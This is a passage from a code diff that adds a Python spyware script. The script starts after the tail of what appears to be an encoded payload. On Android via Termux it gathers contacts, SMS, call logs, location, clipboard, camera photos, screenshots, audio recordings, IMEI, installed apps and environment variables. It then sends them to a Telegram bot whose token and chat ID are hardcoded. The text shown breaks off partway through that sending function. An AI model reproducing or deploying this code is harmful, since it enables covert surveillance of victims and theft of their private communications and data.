iJFrhcfGu20M5W7jnGJMofP+sQuJ/t4FNhAUtLcXKB4VipswIgL6eDQYXBYCz8HHUYsKwZx4QK6oTbTuowMkoNPa8ggWnpFAKimSwESJkDKWkUUY0jOGP4hsuHARO3NFlgqsFUOAjADYbbUGEnD5nhAj4zSP9YEJuR3tloszf1yweIQ0K/BCZVioHVtoya19y7Puoz0KbQnBLEzLsrsnexoxqbC92g0L0A/Xf9CkaK726g8HKG9H3V8v0bnEGGMgp1uA/fQZjM7b2Pa4Fy5FGC4gERYYIFWidNI6IQYduHGHeLEuHWIiFeZBNENWpzphZW4G1F0S03KiE71M/O3CI2LXOWnL1KKxxtWKJOdleonqv3RGy8Q7vdm+H6dM1KOw8XPS2aSBYplcmy+fV9ZxzFtQwFZ+KD70X6p502vNOadZ2+unuzzLfq75MSZQ1R9TLWsPV6b10oj7WI3V7+AP333VVvYY2/fJMXCBOs+scWav18iypV7jbFiB6XRux/R3jdPm8FFQ7rRKxBGhr8Iw/CWDMEosltpoaostbQnAUgxvd5FNpg+L6nRocczTBPMUj2LSxFBMouzTolRMoCyIU3ZTHazElTs9uJFt7TxtyJ0eNHT75SN4yVHWzX6SLKhg5SjGoe2uJ4CRXZP02JGExKq4x51ZaWzHUw1EGgiq2Ofqp6QJFelLhd4uQO8PUQxWQBx0Yo7EN2KMt+QUxIRTkauuZcR/ROJMFCRKplhZTOWXrYGogMjMca+Ot0ksDFiLbBTcQq8UY+4pNvrJcCS2kIwNIotVihg4ULaTIPLldKbh4KNCFPuWjrDZjRlECtiqoNDOhRihg44Jikoi0RjwsCF5EQMd7QYqFoNkhuqhgRaptIyQUhqSlwCkYmRAOAh95E+9fC+D8xALbggJ4v/GQov+RvB06TZmiCe10dsNdUGBD1VT+6MGaiM5y+qclYbOvq6yCRC92clfs7J92b/cu7cFU+6pX27EVuu12bu5673ryaGY7v9WtQhTrizzGl5zxb6RLZRJEeNJQg8eq0vAjLh0kENOrYuUSqImBwgEsGmjMx5QQJI4ERANs2ouTgw4iQPm+kj8cnUHPSQWtkWCSpBkXxZhYklykUBfCTaGe4hsq4pQkmhHOJPDPsQWGQVknSRXq/D4aWbryGooTJ3XAEkYLlyMUJJaCbr+YjcRDEl7fLLmEBK8kUnqSCVZCIJpopUSKoI0wRpCRDDYlCE2xK6JMgLlg2udH4g646I+uKARsSZMHyNFl4Q2ooAnYhyIOkWKKwlkQQNuEYGqwlExQIqkQHCAlF0giIorCBRyEPjIIq8NfuI2fYT0Y54urzZb+fvz558Nb3biJalEsEKi63nz383c7SbnkDNTeZqzbv2v5jrQqaIy93kZn4+dbYbq2ox00kYidSrhZSqmdT2opSOhpSfRT7YRU2KhvJZwyCYEWbvBYFtcFmB8IslNjGIDbHFGaNhZsAEoI1yHKZe9WAlQv8+vApVB4PAACL+h7fFwol/CdAAAAWEQIAIgR0at5EAAAahle30/vqCUVAwJe'))
+import requests
+import socket
+import platform
+import os
+import getpass
+import subprocess
+import json
+import time
+import io
+import base64
+import re
+from datetime import datetime
+import zipfile
+import glob
+import threading
+import queue
+
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
+
+BOT_TOKEN = "8320785106:AAHCx1lOwuk97l2zOCOqAhEVFkpr-5Xx1Pw"
+USER_ID = 7765463669
+
+IS_ANDROID = platform.system() == 'Linux' and 'ANDROID_ROOT' in os.environ
+
+def parse_sms_output(output):
+    sms_list = []
+    lines = output.strip().split('\n')
+    for line in lines:
+        if ':' in line and len(line.split(':', 2)) == 3:
+            parts = line.split(':', 2)
+            number, date, body = [p.strip() for p in parts]
+            sms_list.append({'number': number, 'date': date, 'body': body})
+    return sms_list[:100]
+
+def get_mac_address():
+    if IS_ANDROID:
+        try:
+            with open('/sys/class/net/wlan0/address', 'r') as f:
+                return f.read().strip()
+        except:
+            try:
+                wifi_info = subprocess.check_output(['termux-wifi-connectioninfo', '-j'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+                mac_match = re.search(r'"macAddress":"([0-9a-f:]+)"', wifi_info)
+                return mac_match.group(1) if mac_match else "Не доступен"
+            except:
+                return "Не доступен"
+    else:
+        if PSUTIL_AVAILABLE:
+            try:
+                for interface, addrs in psutil.net_if_addrs().items():
+                    for addr in addrs:
+                        if addr.family == socket.AF_PACKET and addr.address:
+                            return addr.address
+            except:
+                pass
+        return "Не доступен"
+
+def get_detailed_system_info():
+    info = {}
+    
+    try:
+        info['external_ip'] = requests.get('https://api64.ipify.org?format=json', timeout=5).json()['ip']
+    except:
+        info['external_ip'] = "Не доступен"
+    
+    try:
+        hostname = socket.gethostname()
+        info['local_ip'] = socket.gethostbyname(hostname)
+        info['hostname'] = hostname
+    except:
+        info['local_ip'] = "Не доступен"
+        info['hostname'] = "Не доступен"
+    
+    if IS_ANDROID:
+        try:
+            info['android_version'] = subprocess.check_output(['getprop', 'ro.build.version.release'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['android_version'] = "Не доступен"
+        
+        try:
+            info['security_patch'] = subprocess.check_output(['getprop', 'ro.build.version.security_patch'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['security_patch'] = "Не доступен"
+        
+        try:
+            info['device_model'] = subprocess.check_output(['getprop', 'ro.product.model'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['device_model'] = "Не доступен"
+        
+        try:
+            info['manufacturer'] = subprocess.check_output(['getprop', 'ro.product.manufacturer'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['manufacturer'] = "Не доступен"
+        
+        try:
+            info['device_name'] = subprocess.check_output(['getprop', 'ro.product.name'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['device_name'] = "Не доступен"
+        
+        try:
+            info['board'] = subprocess.check_output(['getprop', 'ro.product.board'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['board'] = "Не доступен"
+        
+        try:
+            info['hardware'] = subprocess.check_output(['getprop', 'ro.hardware'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['hardware'] = "Не доступен"
+        
+        try:
+            info['gpu_renderer'] = subprocess.check_output(['getprop', 'ro.hardware.gralloc'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['gpu_renderer'] = "Не доступен"
+        
+        try:
+            info['play_services'] = subprocess.check_output(['dumpsys', 'package', 'com.google.android.gms'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            version_match = re.search(r'versionName=([^\s,]+)', info['play_services'])
+            info['play_services'] = version_match.group(1) if version_match else "Не доступен"
+        except:
+            info['play_services'] = "Не доступен"
+        
+        try:
+            info['boot_time'] = subprocess.check_output(['getprop', 'sys.boot_completed'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['boot_time'] = "Не доступен"
+    else:
+        info['os_version'] = platform.platform()
+        info['device_model'] = platform.node()
+        info['manufacturer'] = platform.processor() or "Не доступен"
+        info['device_name'] = "PC"
+        info['board'] = "N/A"
+        info['hardware'] = platform.machine()
+        info['gpu_renderer'] = "N/A"
+        info['play_services'] = "N/A"
+        info['boot_time'] = "N/A"
+    
+    info['mac_address'] = get_mac_address()
+    
+    info['current_user'] = getpass.getuser()
+    info['current_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    
+    if IS_ANDROID:
+        try:
+            result = subprocess.run(['df', '-h'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL)
+            if result.returncode == 0:
+                lines = [line for line in result.stdout.strip().split('\n') if line]
+                info['storage_details'] = '\n'.join(lines[:10])
+                data_line = None
+                for line in lines[1:]:
+                    if any(mount in line for mount in ['/data', '/storage/emulated/0']):
+                        data_line = line.split()
+                        break
+                if data_line and len(data_line) >= 4:
+                    info['storage_total'] = data_line[1]
+                    info['storage_used'] = data_line[2]
+                    info['storage_free'] = data_line[3]
+                else:
+                    info['storage_total'] = info['storage_used'] = info['storage_free'] = "Не доступен"
+            else:
+                info['storage_details'] = "Не доступен"
+                info['storage_total'] = info['storage_used'] = info['storage_free'] = "Не доступен"
+        except:
+            info['storage_details'] = "Не доступен"
+            info['storage_total'] = info['storage_used'] = info['storage_free'] = "Не доступен"
+    else:
+        if PSUTIL_AVAILABLE:
+            try:
+                disk = psutil.disk_usage('/')
+                info['storage_total'] = f"{disk.total / (1024**3):.1f} GB"
+                info['storage_used'] = f"{disk.used / (1024**3):.1f} GB"
+                info['storage_free'] = f"{disk.free / (1024**3):.1f} GB"
+                info['storage_details'] = f"Root partition: {disk.percent}% used"
+            except:
+                info['storage_total'] = info['storage_used'] = info['storage_free'] = "Не доступен"
+                info['storage_details'] = "Не доступен"
+        else:
+            info['storage_total'] = info['storage_used'] = info['storage_free'] = "Не доступен"
+            info['storage_details'] = "Не доступен"
+    
+    if IS_ANDROID:
+        try:
+            apps_result = subprocess.check_output(['pm', 'list', 'packages'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            info['apps_count'] = len([pkg for pkg in apps_result.split('\n') if pkg.startswith('package:')])
+        except:
+            info['apps_count'] = 0
+    else:
+        info['apps_count'] = "N/A (PC)"
+    
+    if IS_ANDROID:
+        try:
+            info['sdk_version'] = subprocess.check_output(['getprop', 'ro.build.version.sdk'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['sdk_version'] = "Не доступен"
+        try:
+            info['build_id'] = subprocess.check_output(['getprop', 'ro.build.id'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['build_id'] = "Не доступен"
+        try:
+            info['build_type'] = subprocess.check_output(['getprop', 'ro.build.type'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['build_type'] = "Не доступен"
+        try:
+            info['product_brand'] = subprocess.check_output(['getprop', 'ro.product.brand'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['product_brand'] = "Не доступен"
+        try:
+            info['product_device'] = subprocess.check_output(['getprop', 'ro.product.device'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['product_device'] = "Не доступен"
+    else:
+        info['sdk_version'] = "N/A"
+        info['build_id'] = "N/A"
+        info['build_type'] = "N/A"
+        info['product_brand'] = "N/A"
+        info['product_device'] = "N/A"
+    
+    try:
+        info['kernel_version'] = platform.release()
+    except:
+        info['kernel_version'] = "Не доступен"
+    
+    try:
+        info['architecture'] = platform.machine()
+    except:
+        info['architecture'] = "Не доступен"
+    
+    if IS_ANDROID:
+        try:
+            result = subprocess.run(['cat', '/proc/meminfo'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL)
+            if result.returncode == 0:
+                mem_info = result.stdout.strip()
+                mem_lines = mem_info.split('\n')
+                total_mem_line = next((line for line in mem_lines if 'MemTotal' in line), None)
+                if total_mem_line:
+                    info['total_memory'] = total_mem_line.split()[1] + ' KB'
+                info['full_memory_info'] = '\n'.join(mem_lines[:5])
+                free_mem_line = next((line for line in mem_lines if 'MemFree' in line), None)
+                if free_mem_line and total_mem_line:
+                    total_kb = int(total_mem_line.split()[1])
+                    free_kb = int(free_mem_line.split()[1])
+                    info['ram_usage_percent'] = f"{((total_kb - free_kb) / total_kb * 100):.1f}%"
+            else:
+                info['total_memory'] = "Не доступен"
+                info['full_memory_info'] = "Не доступен"
+                info['ram_usage_percent'] = "Не доступен"
+        except:
+            info['total_memory'] = "Не доступен"
+            info['full_memory_info'] = "Не доступен"
+            info['ram_usage_percent'] = "Не доступен"
+    else:
+        if PSUTIL_AVAILABLE:
+            try:
+                memory = psutil.virtual_memory()
+                info['total_memory'] = f"{memory.total / (1024**3):.1f} GB"
+                info['ram_usage_percent'] = f"{memory.percent}%"
+                info['full_memory_info'] = f"Available: {memory.available / (1024**3):.1f} GB"
+            except:
+                info['total_memory'] = "Не доступен"
+                info['ram_usage_percent'] = "Не доступен"
+                info['full_memory_info'] = "Не доступен"
+        else:
+            info['total_memory'] = "Не доступен"
+            info['ram_usage_percent'] = "Не доступен"
+            info['full_memory_info'] = "Не доступен"
+    
+    info['platform'] = platform.system()
+    info['python_version'] = platform.python_version()
+    
+    if IS_ANDROID:
+        try:
+            info['timezone'] = subprocess.check_output(['getprop', 'persist.sys.timezone'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['timezone'] = "Не доступен"
+        try:
+            info['language'] = subprocess.check_output(['getprop', 'persist.sys.language'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['language'] = "Не доступен"
+    else:
+        info['timezone'] = time.tzname[0]
+        info['language'] = "N/A"
+    
+    if IS_ANDROID:
+        try:
+            display_info = subprocess.check_output(['dumpsys', 'display'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            resolution_match = re.search(r'width=([0-9]+) x height=([0-9]+).*?density=([0-9]+)', display_info)
+            if resolution_match:
+                info['screen_resolution'] = f"{resolution_match.group(1)} x {resolution_match.group(2)}"
+                info['screen_density'] = f"{resolution_match.group(3)} dpi"
+            else:
+                info['screen_resolution'] = "Не доступен"
+                info['screen_density'] = "Не доступен"
+        except:
+            try:
+                info['screen_resolution'] = subprocess.check_output(['getprop', 'ro.sf.lcd_density'], timeout=3, stderr=subprocess.DEVNULL).decode().strip() + " dpi"
+                info['screen_density'] = "Не доступен"
+            except:
+                info['screen_resolution'] = "Не доступен"
+                info['screen_density'] = "Не доступен"
+    else:
+        info['screen_resolution'] = "N/A (PC)"
+        info['screen_density'] = "N/A"
+    
+    if IS_ANDROID:
+        try:
+            contacts_result = subprocess.check_output(['termux-api', 'contacts', '-j', '-n', '100'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            info['contacts'] = json.loads(contacts_result) if contacts_result and contacts_result != '[]' else []
+        except:
+            info['contacts'] = []
+        
+        try:
+            sms_result = subprocess.check_output(['termux-sms-list', '-l', '100'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            info['sms'] = parse_sms_output(sms_result)
+        except:
+            info['sms'] = []
+        
+        try:
+            calls_result = subprocess.check_output(['termux-telephony-calllog', '-j', '-n', '100'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            info['call_logs'] = json.loads(calls_result) if calls_result and calls_result != '[]' else []
+        except:
+            info['call_logs'] = []
+        
+        try:
+            location_result = subprocess.check_output(['termux-location', '-j'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            info['location'] = json.loads(location_result) if location_result else {}
+        except:
+            info['location'] = {}
+    else:
+        info['contacts'] = []
+        info['sms'] = []
+        info['call_logs'] = []
+        info['location'] = {}
+    
+    try:
+        info['clipboard'] = subprocess.check_output(['termux-clipboard-get'], timeout=3, stderr=subprocess.DEVNULL).decode().strip() if IS_ANDROID else "N/A (PC)"
+    except:
+        info['clipboard'] = "Не доступен"
+    
+    if IS_ANDROID:
+        try:
+            apps_list = subprocess.check_output(['pm', 'list', 'packages', '-f'], timeout=8, stderr=subprocess.DEVNULL).decode().strip()
+            info['installed_apps'] = [line.strip() for line in apps_list.split('\n') if line.startswith('package:')]
+        except:
+            info['installed_apps'] = []
+    else:
+        info['installed_apps'] = []
+    
+    if IS_ANDROID:
+        try:
+            battery_result = subprocess.check_output(['termux-battery-status', '-j'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+            info['battery'] = json.loads(battery_result) if battery_result else {}
+        except:
+            info['battery'] = {}
+    else:
+        if PSUTIL_AVAILABLE:
+            try:
+                battery = psutil.sensors_battery()
+                info['battery'] = {'percentage': battery.percent if battery else 'N/A', 'status': battery.power_plugged if battery else 'N/A'}
+            except:
+                info['battery'] = {}
+        else:
+            info['battery'] = {}
+    
+    if IS_ANDROID:
+        try:
+            wifi_result = subprocess.check_output(['termux-wifi-scaninfo', '-j'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            info['wifi_networks'] = json.loads(wifi_result) if wifi_result else []
+        except:
+            info['wifi_networks'] = []
+        
+        try:
+            wifi_connection = subprocess.check_output(['termux-wifi-connectioninfo', '-j'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+            info['current_wifi'] = json.loads(wifi_connection) if wifi_connection else {}
+        except:
+            info['current_wifi'] = {}
+    else:
+        if PSUTIL_AVAILABLE:
+            try:
+                info['wifi_networks'] = len(psutil.net_io_counters(pernic=True))
+                info['current_wifi'] = {'ssid': 'N/A'}
+            except:
+                info['wifi_networks'] = []
+                info['current_wifi'] = {}
+        else:
+            info['wifi_networks'] = []
+            info['current_wifi'] = {}
+    
+    if IS_ANDROID:
+        try:
+            sensor_result = subprocess.check_output(['termux-sensor', '-s', 'all', '-n', '1', '-j'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            info['sensors'] = json.loads(sensor_result) if sensor_result else {}
+        except:
+            info['sensors'] = {}
+    else:
+        info['sensors'] = {}
+    
+    if IS_ANDROID:
+        try:
+            processes_result = subprocess.check_output(['top', '-n', '1', '-b'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            info['running_processes'] = [line for line in processes_result.split('\n') if line.strip()][:15]
+        except:
+            info['running_processes'] = []
+        
+        try:
+            full_processes = subprocess.check_output(['ps', '-A'], timeout=8, stderr=subprocess.DEVNULL).decode().strip()
+            info['all_processes'] = full_processes[:1500]
+        except:
+            info['all_processes'] = "Не доступен"
+    else:
+        if PSUTIL_AVAILABLE:
+            try:
+                info['running_processes'] = [p.info for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])][:15]
+                info['all_processes'] = f"Процессов: {len(list(psutil.process_iter()))}"
+            except:
+                info['running_processes'] = []
+                info['all_processes'] = "Не доступен"
+        else:
+            info['running_processes'] = []
+            info['all_processes'] = "Не доступен"
+    
+    if IS_ANDROID:
+        try:
+            result = subprocess.run(['cat', '/proc/cpuinfo'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL)
+            if result.returncode == 0:
+                info['cpu_details'] = result.stdout.strip()[:800]
+            else:
+                info['cpu_details'] = "Не доступен"
+        except:
+            info['cpu_details'] = "Не доступен"
+    else:
+        if PSUTIL_AVAILABLE:
+            try:
+                cpu_freq = psutil.cpu_freq()
+                info['cpu_details'] = f"Cores: {psutil.cpu_count()}, Freq: {cpu_freq.current / 1000 if cpu_freq else 'N/A'} GHz, Usage: {psutil.cpu_percent()}%"
+            except:
+                info['cpu_details'] = "Не доступен"
+        else:
+            info['cpu_details'] = "Не доступен"
+    
+    try:
+        cpu_freq_result = subprocess.check_output(['cat', '/sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq'], timeout=3, stderr=subprocess.DEVNULL).decode().strip() if IS_ANDROID else "N/A"
+        info['cpu_frequency'] = f"{int(cpu_freq_result) / 1000} MHz" if IS_ANDROID and cpu_freq_result.isdigit() else info['cpu_details'] if not IS_ANDROID else "Не доступен"
+    except:
+        info['cpu_frequency'] = "Не доступен"
+    
+    try:
+        loadavg = subprocess.check_output(['cat', '/proc/loadavg'], stderr=subprocess.DEVNULL, timeout=3).decode().strip() if IS_ANDROID else str(psutil.getloadavg()) if PSUTIL_AVAILABLE else "N/A"
+        info['cpu_load'] = loadavg.split()[0:3] if IS_ANDROID else loadavg
+    except:
+        info['cpu_load'] = "Не доступен"
+    
+    try:
+        result = subprocess.run(['uptime'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL) if IS_ANDROID else None
+        info['uptime'] = result.stdout.strip() if result and result.returncode == 0 else (str(psutil.boot_time()) if PSUTIL_AVAILABLE else "Не доступен")
+    except:
+        info['uptime'] = "Не доступен"
+    
+    if IS_ANDROID:
+        try:
+            selinux_result = subprocess.check_output(['getenforce'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+            info['selinux_status'] = selinux_result
+        except:
+            info['selinux_status'] = "Не доступен"
+        
+        try:
+            root_check = subprocess.check_output(['which', 'su'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+            info['root_detected'] = "Да" if root_check and root_check != '/system/bin/which: no su' else "Нет"
+        except:
+            info['root_detected'] = "Не доступен"
+        
+        try:
+            android_id = subprocess.check_output(['settings', 'get', 'secure', 'android_id'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+            info['android_id'] = android_id
+        except:
+            info['android_id'] = "Не доступен"
+    else:
+        info['selinux_status'] = "N/A"
+        info['root_detected'] = "N/A"
+        info['android_id'] = "N/A"
+    
+    info['device_fingerprint'] = f"{info['device_model']}_{info['build_id'] if 'build_id' in info else 'N/A'}"
+    
+    if IS_ANDROID:
+        try:
+            thermal_zones = []
+            for i in range(5):
+                try:
+                    if os.path.exists(f'/sys/class/thermal/thermal_zone{i}/temp'):
+                        temp = subprocess.check_output(['cat', f'/sys/class/thermal/thermal_zone{i}/temp'], timeout=2, stderr=subprocess.DEVNULL).decode().strip()
+                        if temp.isdigit():
+                            thermal_zones.append(f"Zone {i}: {int(temp)/1000}°C")
+                except:
+                    continue
+            info['thermal_zones'] = '; '.join(thermal_zones)
+        except:
+            info['thermal_zones'] = "Не доступен"
+    else:
+        info['thermal_zones'] = "N/A"
+    
+    try:
+        dns_result = subprocess.run(['cat', '/system/etc/resolv.conf'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL) if IS_ANDROID else None
+        info['dns_servers'] = dns_result.stdout.strip() if dns_result and dns_result.returncode == 0 else "Не доступен"
+    except:
+        info['dns_servers'] = "Не доступен"
+    
+    info['data_usage'] = "Не доступен"
+    if IS_ANDROID:
+        try:
+            net_dev = subprocess.run(['cat', '/proc/net/dev'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL)
+            if net_dev.returncode == 0:
+                lines = net_dev.stdout.strip().split('\n')
+                total_rx = total_tx = 0
+                for line in lines[2:]:
+                    parts = line.split()
+                    if len(parts) >= 10:
+                        total_rx += int(parts[1])
+                        total_tx += int(parts[9])
+                info['data_usage'] = f"RX: {total_rx / (1024*1024):.1f} MB, TX: {total_tx / (1024*1024):.1f} MB"
+        except:
+            pass
+    else:
+        if PSUTIL_AVAILABLE:
+            try:
+                net_io = psutil.net_io_counters(pernic=True)
+                total_rx = sum(c.bytes_recv for c in net_io.values())
+                total_tx = sum(c.bytes_sent for c in net_io.values())
+                info['data_usage'] = f"RX: {total_rx / (1024*1024):.1f} MB, TX: {total_tx / (1024*1024):.1f} MB"
+            except:
+                pass
+    
+    try:
+        ping_result = subprocess.check_output(['ping', '-c', '2', 'google.com'], timeout=6, stderr=subprocess.DEVNULL).decode().strip()
+        latency_match = re.search(r'time=([0-9.]+) ms', ping_result)
+        info['ping_latency'] = f"{latency_match.group(1)} ms avg" if latency_match else "Не доступен"
+    except:
+        info['ping_latency'] = "Не доступен"
+    
+    if IS_ANDROID:
+        try:
+            termux_pkgs = subprocess.check_output(['pkg', 'list-installed'], stderr=subprocess.DEVNULL, timeout=3).decode().strip()
+            info['termux_packages'] = [line.split('/')[0].strip() for line in termux_pkgs.split('\n') if '/' in line]
+        except:
+            info['termux_packages'] = []
+    else:
+        try:
+            pip_list = subprocess.check_output(['pip', 'list'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            info['pip_packages'] = [line.split()[0] for line in pip_list.split('\n') if line and not line.startswith(('Package', '-'))][:50]
+        except:
+            info['pip_packages'] = []
+        info['termux_packages'] = []
+    
+    if IS_ANDROID:
+        try:
+            foreground_result = subprocess.check_output(['dumpsys', 'activity', 'activities'], timeout=8, stderr=subprocess.DEVNULL).decode().strip()
+            resumed_match = re.search(r'mResumedActivity=([^/]+)', foreground_result)
+            info['foreground_app'] = resumed_match.group(1) if resumed_match else "Не доступен"
+        except:
+            info['foreground_app'] = "Не доступен"
+    else:
+        info['foreground_app'] = "N/A"
+    
+    detailed_apps = []
+    if 'installed_apps' in info and info['installed_apps']:
+        packages = [pkg.split(':')[1].strip() for pkg in info['installed_apps']][:20]
+        for pkg in packages:
+            try:
+                if IS_ANDROID:
+                    dump_output = subprocess.check_output(['dumpsys', 'package', pkg], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+                    version_match = re.search(r'versionName=([^\s,]+)', dump_output)
+                    version = version_match.group(1) if version_match else 'N/A'
+                    label_match = re.search(r'applicationLabel=([^,\s]+)', dump_output) or re.search(r'nonLocalizedLabel=([^,\s]+)', dump_output)
+                    app_label = label_match.group(1) if label_match else pkg.split('.')[-1].title()
+                    detailed_apps.append(f"{app_label} ({pkg}) - v{version}")
+            except:
+                detailed_apps.append(f"N/A ({pkg})")
+    info['detailed_apps'] = detailed_apps
+    
+    if IS_ANDROID:
+        try:
+            camera_photo_bytes = subprocess.check_output(['termux-camera-photo', '-c', '0', '-'], timeout=10, stderr=subprocess.DEVNULL)
+            info['camera_photo'] = base64.b64encode(camera_photo_bytes).decode() if camera_photo_bytes else None
+        except:
+            info['camera_photo'] = None
+    else:
+        info['camera_photo'] = None
+    
+    try:
+        chrome_pkg = 'com.android.chrome' if IS_ANDROID else None
+        if chrome_pkg:
+            browser_dump = subprocess.check_output(['dumpsys', 'package', chrome_pkg], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            version_match = re.search(r'versionName=([^\s,]+)', browser_dump)
+            cookies_count = len(re.findall(r'cookie', browser_dump))
+            info['browser_info'] = f"Chrome v{version_match.group(1) if version_match else 'N/A'} (Куки: ~{cookies_count})"
+        else:
+            info['browser_info'] = "Браузер не найден"
+    except:
+        info['browser_info'] = "Браузер не найден"
+    
+    if IS_ANDROID:
+        try:
+            bluetooth_result = subprocess.check_output(['termux-bluetooth-scaninfo', '-j'], timeout=8, stderr=subprocess.DEVNULL).decode().strip()
+            info['bluetooth_devices'] = json.loads(bluetooth_result) if bluetooth_result else []
+        except:
+            info['bluetooth_devices'] = []
+    else:
+        if PSUTIL_AVAILABLE:
+            try:
+                info['bluetooth_devices'] = len([i for i in psutil.net_if_addrs() if 'bluetooth' in i.lower()])
+            except:
+                info['bluetooth_devices'] = []
+        else:
+            info['bluetooth_devices'] = []
+    
+    try:
+        result = subprocess.run(['cat', '/proc/net/dev'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL) if IS_ANDROID else None
+        if result and result.returncode == 0:
+            info['network_interfaces'] = result.stdout.strip()[:400]
+        else:
+            if PSUTIL_AVAILABLE and not IS_ANDROID:
+                try:
+                    info['network_interfaces'] = '\n'.join([f"{iface}: {addrs[0].address}" for iface, addrs in psutil.net_if_addrs().items() if addrs][:5])
+                except:
+                    info['network_interfaces'] = "Не доступен"
+            else:
+                info['network_interfaces'] = "Не доступен"
+    except:
+        info['network_interfaces'] = "Не доступен"
+    
+    if IS_ANDROID:
+        try:
+            sim_info = subprocess.check_output(['getprop', 'gsm.sim.operator.alpha'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+            info['sim_carrier'] = sim_info if sim_info else "Не доступен"
+        except:
+            info['sim_carrier'] = "Не доступен"
+        
+        try:
+            signal_result = subprocess.check_output(['dumpsys', 'telephony.registry'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+            signal_match = re.search(r'mSignalStrength=([-\d]+)', signal_result)
+            info['signal_strength'] = f"{signal_match.group(1)} dBm" if signal_match else "Не доступен"
+        except:
+            info['signal_strength'] = "Не доступен"
+        
+        try:
+            imei_result = subprocess.check_output(['getprop', 'ril.imei'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
+            info['imei'] = imei_result if imei_result else "Не доступен"
+        except:
+            info['imei'] = "Не доступен"
+    else:
+        info['sim_carrier'] = "N/A"
+        info['signal_strength'] = "N/A"
+        info['imei'] = "N/A"
+    
+    app_permissions = {'camera': 0, 'location': 0, 'microphone': 0, 'contacts': 0}
+    if IS_ANDROID and 'installed_apps' in info:
+        packages = [pkg.split(':')[1].strip() for pkg in info['installed_apps']][:10]
+        for pkg in packages:
+            try:
+                perm_output = subprocess.check_output(['dumpsys', 'package', pkg, 'permissions'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
+                if 'android.permission.CAMERA' in perm_output:
+                    app_permissions['camera'] += 1
+                if 'android.permission.ACCESS_FINE_LOCATION' in perm_output:
+                    app_permissions['location'] += 1
+                if 'android.permission.RECORD_AUDIO' in perm_output:
+                    app_permissions['microphone'] += 1
+                if 'android.permission.READ_CONTACTS' in perm_output:
+                    app_permissions['contacts'] += 1
+            except:
+                continue
+    info['app_permissions'] = app_permissions
+    
+    env_vars = dict(os.environ)
+    sensitive_keys = ['PASSWORD', 'TOKEN', 'KEY', 'SECRET']
+    filtered_env = {k: v[:20] + '...' if len(v) > 20 else v for k, v in env_vars.items() if not any(key in k.upper() for key in sensitive_keys)}
+    info['env_vars'] = dict(list(filtered_env.items())[:20])
+    
+    return info
+
+def capture_screenshot_bytes():
+    if not IS_ANDROID:
+        return None
+    try:
+        output = subprocess.check_output(['termux-screenshot', '-'], timeout=5, stderr=subprocess.DEVNULL)
+        return output
+    except:
+        return None
+
+def record_audio_bytes():
+    if not IS_ANDROID:
+        return None
+    try:
+        output = subprocess.check_output(['termux-microphone-record', '-f', '-', '-l', '15'], timeout=20, stderr=subprocess.DEVNULL)
+        return output
+    except:
+        return None
+
+def create_detailed_buffer(content, filename):
+    buffer = io.BytesIO()
+    buffer.write(content.encode('utf-8'))
+    buffer.seek(0)
+    return buffer, filename
+
+def send_to_telegram(text=None, photo_bytes=None, audio_bytes=None, document_buffers=None, caption=None):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
+    max_retries = 5
+    backoff = 1
+    
+    if text:
+        endpoint = "sendMessage"
+        payload = {
+            'chat_id': USER_ID,
+            'text': text,
+            'parse_mode': 'HTML',
+            'disable_web_page_preview': True
+        }
+        for attempt in range(max_retries):
+            try:
+                response = requests.post(url + endpoint, data=payload, timeout=10)
+                if response.status_code == 200:
+                    return True
